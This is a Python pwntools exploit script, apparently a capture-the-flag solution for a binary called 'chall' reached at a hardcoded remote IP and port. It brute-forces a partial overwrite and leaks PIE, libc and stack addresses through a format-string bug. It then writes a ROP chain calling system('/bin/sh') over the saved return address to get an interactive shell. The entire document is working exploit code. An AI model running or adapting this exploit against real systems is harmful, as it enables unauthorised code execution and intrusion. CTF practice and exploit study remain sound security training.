#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 45.153.243.57 13337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def edit(data):
    io.sendlineafter(b"> ", b"1")
    io.sendafter(b"text: ", data)


def save():
    io.sendlineafter(b"> ", b"2")


def show():
    io.sendlineafter(b"> ", b"4")


env = {}

guess = 0x8020
with log.progress("partial brute forcing") as pro:
    while True:
        context.log_level = "CRITICAL"
        io = start()
        payload = b"%x|".ljust(0x100, b"\x00")
        payload += p16(guess)
        edit(payload)
        show()
        try:
            r = io.recvline()
            if b". edit textMenu" in r:
                io.close()
                continue
        except EOFError:
            io.close()
            continue
        context.log_level = "INFO"
        break

if b". edit textMenu" in r:
    guess += 0x1000
elif b"\xff5j/Menu" in r:
    guess += 0x3000
elif b"@Menu" in r:
    guess += 0x4000
# print(r)
# print(hex(guess))


leak = []
n_leak = 0x10
identifier = cyclic(8)
for k in range(0, 0x4):
    payload = identifier
    for i in range(0, n_leak):
        payload += f"%{i + k*n_leak}$p\n".encode()

    payload = payload.ljust(0x100, b"\x00")
    payload += p16(guess)
    edit(payload)
    save()
    show()
    for j in range(0, n_leak):
        leak.append(io.recvline(keepends=False))


offset = None
for idx, v in enumerate(leak):
    if v == b"(nil)":
        continue
    if hex(u64(identifier)).encode() == v:
        offset = idx
    # print(idx, v)


log.info(f"{offset=}")


def printf_leak(idx):
    payload = f"%{idx}$p\n\x00".encode()
    edit(payload)
    show()
    return io.recvline(keepends=False)


pie_leak = int(printf_leak(7), 16)
elf.address = pie_leak - 0x1406
assert (elf.address & 0xfff == 0)
log.info(f"{elf.address=:#x}")

libc_leak = int(printf_leak(45), 16)
libc.address = libc_leak - 0x29d90
assert (libc.address & 0xfff == 0)
log.info(f"{libc.address=:#x}")

stack_leak = int(printf_leak(6), 16)
log.info(f"{stack_leak=:#x}")
saved_rip = stack_leak + 0x8
log.info(f"{saved_rip=:#x}")


def arb_write(addr, data):
    payload = fmtstr_payload(offset, {addr: data}, write_size="byte")
    edit(payload)
    save()
    show()


rop = ROP(libc)
rop.raw(rop.ret.address)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])

payload = rop.chain()
for i in range(0, len(payload), 8):
    arb_write(saved_rip + i, payload[i:i + 8])

io.sendlineafter(b"> ", b"3")
io.interactive()
